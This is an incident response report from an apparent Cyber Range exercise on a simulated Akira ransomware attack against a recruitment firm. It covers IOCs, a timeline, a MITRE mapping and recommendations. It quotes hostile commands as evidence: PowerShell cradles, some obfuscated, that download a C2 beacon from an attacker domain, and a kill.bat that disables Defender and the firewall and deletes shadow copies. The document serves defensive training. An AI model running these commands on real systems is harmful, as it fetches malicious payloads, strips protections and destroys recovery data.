# 🔴 Incident Response Report — Akira Ransomware
### Ashford Sterling Recruitment | January 27, 2026

> **TLP:RED** — This report documents a completed Cyber Range investigation. All IOCs, hashes, and infrastructure references relate to a simulated environment.

---

## 📋 Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Ransom Note & Threat Actor](#2-ransom-note--threat-actor)
3. [Infrastructure & C2](#3-infrastructure--c2)
4. [Initial Access](#4-initial-access)
5. [Command & Control Beacon](#5-command--control-beacon)
6. [Defence Evasion](#6-defence-evasion)
7. [Credential Access](#7-credential-access)
8. [Reconnaissance](#8-reconnaissance--network-scanning)
9. [Lateral Movement](#9-lateral-movement)
10. [Data Exfiltration](#10-data-exfiltration)
11. [Ransomware Deployment](#11-ransomware-deployment)
12. [Attack Timeline](#12-attack-timeline)
13. [Indicators of Compromise](#13-indicators-of-compromise)
14. [MITRE ATT&CK Mapping](#14-mitre-attck-mapping)
15. [Recommendations](#15-recommendations)

---

## 1. Executive Summary

On **January 27, 2026**, Ashford Sterling Recruitment was struck by a ransomware attack attributed to the **Akira** group. The threat actor leveraged pre-staged access from a prior intrusion to deploy ransomware across the network, encrypting files and exfiltrating data before encryption began.

| Field | Detail |
|---|---|
| **Client** | Ashford Sterling Recruitment |
| **Incident Date** | January 27, 2026 |
| **Threat Group** | Akira Ransomware |
| **Affected Hosts** | AS-PC2, AS-SRV |
| **Compromised User** | David.Mitchell (AS-PC2) |
| **Encrypted Extension** | `.akira` |
| **Encryption Start (UTC)** | 22:18:33 |
| **Analyst** | Quincy Jones Jr |

---

## 2. Ransom Note & Threat Actor

The Akira group left a ransom note providing a TOR negotiation portal and a unique victim ID.

| Field | Value |
|---|---|
| **Ransomware Group** | Akira |
| **TOR Portal** | `akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion` |
| **Victim ID** | `813R-QWJM-XKIJ` |
| **Encrypted Extension** | `.akira` |
| **Ransom Note Dropped By** | `updater.exe` |
| **Ransom Note Time (UTC)** | `22:18:33` |

<details>
<summary>📸 Screenshots</summary>

> **Ransom Note Contents**
> 
> ![Ransom Note]()

> **Encrypted Files with .akira Extension**
> 
> ![Encrypted Files]()

</details>

---

## 3. Infrastructure & C2

The attacker operated a multi-domain infrastructure for payload hosting, C2 communications, and remote tool relay. Several domains overlap with the prior Broker intrusion.

| Type | Value | Description |
|---|---|---|
| Domain | `sync.cloud-endpoint.net` | Payload hosting (scan.exe, wsync.exe) |
| Domain | `cdn.cloud-endpoint.net` | Ransomware staging domain |
| IP | `104.21.30.237` | C2 server IP |
| IP | `172.67.174.46` | C2 server IP |
| Domain | `relay-0b975d23.net.anydesk.com` | AnyDesk relay server |

> ⚠️ **Do not browse to these domains directly.**

<details>
<summary>📸 Screenshots</summary>

> **C2 Network Connections — DeviceNetworkEvents**
>
> ![C2 Connections]()

> **AnyDesk Relay Connection**
>
> ![AnyDesk Relay]()

</details>

---

## 4. Initial Access

The attacker gained entry using **AnyDesk**, pre-staged during the prior Broker intrusion. It was executed from `C:\Users\Public` — a world-writable staging directory — rather than its legitimate install path.

| Field | Value |
|---|---|
| **Tool** | AnyDesk |
| **Execution Path** | `C:\Users\Public\AnyDesk.exe` |
| **Compromised User** | `AS-PC2\David.Mitchell` |
| **Attacker External IP** | `88.97.164.155` |
| **Session Type** | Remote Interactive (Guacamole RDP) |
| **MITRE** | `T1219` — Remote Access Software |

<details>
<summary>📸 Screenshots</summary>

> **AnyDesk Process Creation from C:\Users\Public**
>
> ![AnyDesk Execution]()

> **Logon Event — David.Mitchell from 88.97.164.155**
>
> ![Logon Event]()

</details>

---

## 5. Command & Control Beacon

A custom C2 beacon (`wsync.exe`) was deployed to maintain persistent communications. The original beacon on AS-PC2 failed and was replaced. A separate beacon was deployed to AS-SRV during lateral movement.

```powershell
# Download cradle used to deploy beacon
Invoke-WebRequest -Uri "https://sync.cloud-endpoint.net/wsync.exe" -OutFile "C:\ProgramData\wsync.exe"

# Obfuscated variants also observed
$d="sync.cloud"+"-endpoint.net"; IWR -Uri "https://$d/wsync.exe" -OutFile "C:\ProgramData\wsync.exe"
$u=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9zeW5jLmNsb3VkLWVuZHBvaW50Lm5ldC93c3luYy5leGU="))
```

| Field | Value |
|---|---|
| **Filename** | `wsync.exe` |
| **Path** | `C:\ProgramData\wsync.exe` |
| **SHA256 (v1 — AS-PC2)** | `66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b` |
| **SHA256 (v2 — replacement)** | `0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654` |
| **Dropper** | `powershell.exe` via `Invoke-WebRequest` |
| **MITRE** | `T1105` — Ingress Tool Transfer |

<details>
<summary>📸 Screenshots</summary>

> **PowerShell Invoke-WebRequest dropping wsync.exe**
>
> ![wsync Drop]()

> **wsync.exe FileCreated Event — DeviceFileEvents**
>
> ![wsync FileCreated]()

</details>

---

## 6. Defence Evasion

Before ransomware deployment, the attacker systematically dismantled host defences using `kill.bat` and direct PowerShell commands. The Windows Firewall was disabled and Volume Shadow Copies were deleted.

```batch
:: kill.bat — Defender teardown
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell -Command "Set-MpPreference -DisableScriptScanning $true"
powershell -Command "Set-MpPreference -DisableIOAVProtection $true"
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
net stop WinDefend /y
netsh advfirewall set allprofiles state off
wmic shadowcopy delete /nointeractive
```

| Field | Value |
|---|---|
| **Script** | `kill.bat` |
| **SHA256** | `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c` |
| **Path** | `C:\ProgramData\kill.bat` |
| **Registry Key** | `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware` |
| **Registry Modified (UTC)** | `21:03:42` |
| **MITRE** | `T1562.001`, `T1562.004`, `T1490` |

<details>
<summary>📸 Screenshots</summary>

> **cmd.exe executing kill.bat — DeviceProcessEvents**
>
> ![kill.bat Execution]()

> **Set-MpPreference Commands — Script Block Logging**
>
> ![Defender Disabled]()

> **Registry Modification — DisableAntiSpyware**
>
> ![Registry Tamper]()

</details>

---

## 7. Credential Access

The attacker targeted LSASS to harvest credentials for lateral movement using direct named pipe access — a technique consistent with credential dumping tooling.

```powershell
# Process enumeration to locate LSASS
tasklist | findstr lsass

# Named pipe accessed
\Device\NamedPipe\lsass
```

| Field | Value |
|---|---|
| **Enumeration Command** | `tasklist \| findstr lsass` |
| **Named Pipe** | `\Device\NamedPipe\lsass` |
| **Pipe Operation** | File opened (Client end) |
| **Additional** | `powershell.exe` performed LSASS memory reads (25,864 bytes, 201 reads) |
| **MITRE** | `T1003.001` — LSASS Memory |

<details>
<summary>📸 Screenshots</summary>

> **tasklist | findstr lsass — DeviceProcessEvents**
>
> ![Process Enum]()

> **NamedPipeEvent — \Device\NamedPipe\lsass**
>
> ![Named Pipe]()

> **powershell.exe LSASS Memory Read**
>
> ![LSASS Read]()

</details>

---

## 8. Reconnaissance & Network Scanning

Advanced IP Scanner (disguised as `scan.exe`) was used to enumerate the internal network. `bitsadmin` failed on the first download attempt; `Invoke-WebRequest` succeeded as the fallback.

```powershell
# First attempt — bitsadmin (failed)
bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Users\david.mitchell\Downloads\scan.exe

# Fallback — Invoke-WebRequest
Invoke-WebRequest -Uri "https://sync.cloud-endpoint.net/scan.exe" -OutFile "C:\Users\david.mitchell\Downloads\scan.exe"

# Execution
"advanced_ip_scanner.exe" /portable "C:/Users/david.mitchell/Downloads/" /lng en_us
```

| Field | Value |
|---|---|
| **Scanner** | `scan.exe` (Advanced IP Scanner) |
| **SHA256** | `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b` |
| **Execution Path** | `C:\Users\David.Mitchell\Downloads\scan.exe` |
| **Arguments** | `/portable "C:/Users/david.mitchell/Downloads/" /lng en_us` |
| **IPs Enumerated** | `10.1.0.183`, `10.1.0.154` |
| **Ports Scanned** | `445` (SMB), `4899` (Radmin) |
| **MITRE** | `T1046`, `T1595`, `T1021.002` |

<details>
<summary>📸 Screenshots</summary>

> **bitsadmin download attempt**
>
> ![bitsadmin]()

> **Invoke-WebRequest downloading scan.exe**
>
> ![IWR Download]()

> **advanced_ip_scanner.exe SMB connections**
>
> ![Network Scan]()

</details>

---

## 9. Lateral Movement

The `AS.SRV.Administrator` account was used to move from the compromised workstation (AS-PC2) to the file server (AS-SRV) via NTLM network authentication.

| Field | Value |
|---|---|
| **Account Used** | `AS.SRV.Administrator` |
| **Source Host** | AS-PC2 |
| **Target Host** | AS-SRV |
| **Auth Method** | NTLM (Network logon) |
| **MITRE** | `T1021.002` — SMB/Windows Admin Shares |

<details>
<summary>📸 Screenshots</summary>

> **Logon Event — AS.SRV.Administrator from AS-PC2**
>
> ![Lateral Logon]()

> **powershell.exe accessing \Device\NamedPipe\srvsvc**
>
> ![srvsvc Pipe]()

</details>

---

## 10. Data Exfiltration

Prior to encryption, data was compressed and staged using `st.exe` — a custom archiving tool dropped to `C:\Users\Public`. A ZIP archive was created and likely exfiltrated before ransomware execution.

| Field | Value |
|---|---|
| **Staging Tool** | `st.exe` |
| **Tool SHA256** | `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015` |
| **Tool Path** | `C:\Users\Public\st.exe` |
| **Archive Created** | `exfil_data.zip` |
| **Archive Path** | `C:\Users\Public\exfil_data.zip` |
| **Archive SHA256** | `082fb434ee2a2663343ab2d3088435cd49ceaf8168521ed7e0613ddb4ac90ec0` |
| **Archive Size** | ~1.1 MB |
| **MITRE** | `T1560.001`, `T1041` |

<details>
<summary>📸 Screenshots</summary>

> **st.exe creating exfil_data.zip — DeviceFileEvents**
>
> ![st.exe Exfil]()

> **exfil_data.zip FileCreated with SHA256**
>
> ![Exfil Archive]()

</details>

---

## 11. Ransomware Deployment

The Akira ransomware binary was disguised as `updater.exe` and staged on AS-SRV via PowerShell. At **22:18:33 UTC** the ransom note was dropped and file encryption began. A cleanup script (`clean.bat`) deleted the binary post-encryption.

| Field | Value |
|---|---|
| **Ransomware Binary** | `updater.exe` |
| **SHA256** | `e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b` |
| **Staged Path** | `C:\ProgramData\updater.exe` |
| **Staged By** | `powershell.exe` |
| **File Size** | 18,432 bytes (~18 KB) |
| **Encryption Start (UTC)** | `22:18:33` |
| **Encrypted Extension** | `.akira` |
| **Cleanup Script** | `clean.bat` |
| **VSS Deletion** | `wmic shadowcopy delete /nointeractive` |
| **MITRE** | `T1486`, `T1490`, `T1059.001`, `T1070.004` |

<details>
<summary>📸 Screenshots</summary>

> **updater.exe FileCreated — DeviceFileEvents**
>
> ![updater.exe Created]()

> **updater.exe Process Execution — DeviceProcessEvents**
>
> ![updater.exe Exec]()

> **wmic shadowcopy delete**
>
> ![VSS Delete]()

> **Files with .akira Extension**
>
> ![Encrypted Files]()

</details>

---

## 12. Attack Timeline

> All times UTC — January 27, 2026

| Time (UTC) | Host | Event | MITRE |
|---|---|---|---|
| ~14:15 | AS-PC2 | AnyDesk executed from `C:\Users\Public` — initial access | T1219 |
| ~14:19 | AS-PC2 | David.Mitchell RDP session from `88.97.164.155` | T1078 |
| ~15:15 | AS-PC2 | Bare `powershell.exe` spawned — attacker interactive shell | T1059.001 |
| ~15:17 | AS-PC2 | `scan.exe` downloaded via `Invoke-WebRequest` | T1105 |
| ~15:17 | AS-PC2 | Advanced IP Scanner executed — network enumeration | T1046 |
| ~15:22 | AS-PC2 | `wsync.exe` beacon v1 dropped to `C:\ProgramData` | T1105 |
| ~15:25 | AS-PC2 | `powershell.exe` reads LSASS memory — credential theft | T1003.001 |
| ~15:44 | AS-PC2 | `wsync.exe` beacon v2 deployed (v1 failed) | T1105 |
| ~15:44 | AS-PC2 | `wsync.exe` executed — C2 beacon active | T1543 |
| ~16:03 | AS-PC2 | `kill.bat` executed — Defender disabled, firewall off, VSS deleted | T1562.001 |
| ~20:15 | AS-SRV | Lateral movement via `AS.SRV.Administrator` | T1021.002 |
| ~22:15 | AS-SRV | `updater.exe` staged to `C:\ProgramData` via PowerShell | T1105 |
| ~22:24 | AS-SRV | `st.exe` compresses data — `exfil_data.zip` created | T1560.001 |
| **22:18:33** | AS-SRV | `updater.exe` drops ransom note — **encryption begins** | T1486 |
| Post-enc | AS-SRV | `clean.bat` deletes ransomware binary | T1070.004 |

---

## 13. Indicators of Compromise

### Network

| Type | Value | Description |
|---|---|---|
| Domain | `sync.cloud-endpoint.net` | Payload C2 domain |
| Domain | `cdn.cloud-endpoint.net` | Ransomware staging |
| Domain | `relay-0b975d23.net.anydesk.com` | AnyDesk relay |
| IP | `104.21.30.237` | C2 server |
| IP | `172.67.174.46` | C2 server |
| IP | `88.97.164.155` | Attacker external IP |

### File Hashes (SHA256)

| Filename | SHA256 | Description |
|---|---|---|
| `updater.exe` | `e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b` | Akira ransomware |
| `wsync.exe` (v1) | `66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b` | C2 beacon — original |
| `wsync.exe` (v2) | `0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654` | C2 beacon — replacement |
| `st.exe` | `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015` | Exfil staging tool |
| `exfil_data.zip` | `082fb434ee2a2663343ab2d3088435cd49ceaf8168521ed7e0613ddb4ac90ec0` | Exfiltration archive |
| `kill.bat` | `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c` | Defence evasion script |
| `scan.exe` | `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b` | Network scanner |

> ⚠️ **Do not upload these hashes to VirusTotal** — this is a private Cyber Range exercise.

### Files & Paths

| Path | Description |
|---|---|
| `C:\Users\Public\AnyDesk.exe` | RAT — attacker staging location |
| `C:\ProgramData\wsync.exe` | C2 beacon |
| `C:\ProgramData\kill.bat` | Defence evasion script |
| `C:\ProgramData\updater.exe` | Ransomware binary |
| `C:\Users\Public\st.exe` | Exfil staging tool |
| `C:\Users\Public\exfil_data.zip` | Exfiltration archive |

### Accounts

| Account | Description |
|---|---|
| `AS-PC2\David.Mitchell` | Compromised user account |
| `AS.SRV.Administrator` | Used for lateral movement to AS-SRV |

---

## 14. MITRE ATT&CK Mapping

| Technique ID | Tactic | Description |
|---|---|---|
| `T1219` | Initial Access | Remote Access Software — AnyDesk |
| `T1078` | Initial Access | Valid Accounts — David.Mitchell |
| `T1059.001` | Execution | PowerShell — attacker shell & beacon dropper |
| `T1105` | C2 | Ingress Tool Transfer — wsync.exe, scan.exe, updater.exe |
| `T1003.001` | Credential Access | LSASS Memory — powershell.exe reads lsass |
| `T1046` | Discovery | Network Service Scanning — Advanced IP Scanner |
| `T1595` | Reconnaissance | Active Scanning — horizontal port scan |
| `T1021.002` | Lateral Movement | SMB/Windows Admin Shares — AS.SRV.Administrator |
| `T1562.001` | Defence Evasion | Disable or Modify Tools — kill.bat, Set-MpPreference |
| `T1562.004` | Defence Evasion | Disable or Modify System Firewall — netsh |
| `T1112` | Defence Evasion | Modify Registry — DisableAntiSpyware |
| `T1490` | Impact | Inhibit System Recovery — VSS deletion |
| `T1560.001` | Exfiltration | Archive via Utility — st.exe / exfil_data.zip |
| `T1486` | Impact | Data Encrypted for Impact — Akira ransomware |
| `T1070.004` | Defence Evasion | File Deletion — clean.bat removes ransomware binary |

---

## 15. Recommendations

### 🚨 Immediate

- [ ] Isolate AS-PC2 and AS-SRV from the network pending full forensic imaging
- [ ] Reset credentials for `David.Mitchell` and `AS.SRV.Administrator` immediately
- [ ] Block all IOC domains and IPs at the firewall and DNS layer
- [ ] Restore encrypted systems from clean offline backups — do not pay the ransom
- [ ] Re-enable and update Microsoft Defender across all endpoints

### 🔧 Short-Term Hardening

- [ ] Audit all accounts with domain administrative privileges
- [ ] Enable **Tamper Protection** on Microsoft Defender to prevent PowerShell-based disabling
- [ ] Implement application allowlisting — block unknown executables in `C:\Users\Public` and `C:\ProgramData`
- [ ] Enable PowerShell **Script Block Logging** and **Constrained Language Mode**
- [ ] Alert on `bitsadmin`, `Invoke-WebRequest`, and `Set-MpPreference` used in the same process context
- [ ] Enforce MFA on all RDP and remote access entry points
- [ ] Remove or block AnyDesk and other unauthorised remote access tools via policy

### 🏗️ Strategic

- [ ] Review the prior Broker intrusion to identify any remaining pre-staged access vectors
- [ ] Implement network segmentation to limit lateral movement between workstations and servers
- [ ] Establish and regularly test an offline backup and recovery process against ransomware scenarios
- [ ] Consider engaging an MDR provider for continuous threat monitoring

---

## 🛠️ Investigation Tools Used

| Tool | Purpose |
|---|---|
| Microsoft Defender for Endpoint | Advanced Hunting (KQL) |
| Microsoft Sentinel | Log correlation |
| KQL — `DeviceProcessEvents` | Process execution analysis |
| KQL — `DeviceFileEvents` | File creation & staging |
| KQL — `DeviceNetworkEvents` | C2 and exfil traffic |
| KQL — `DeviceEvents` (NamedPipeEvent) | Credential theft detection |
| KQL — `DeviceRegistryEvents` | Registry tampering |

---

<div align="center">

**Cyber Range — SancLogic Security Operations**  
*Ashford Sterling Recruitment — The Buyer*

</div>
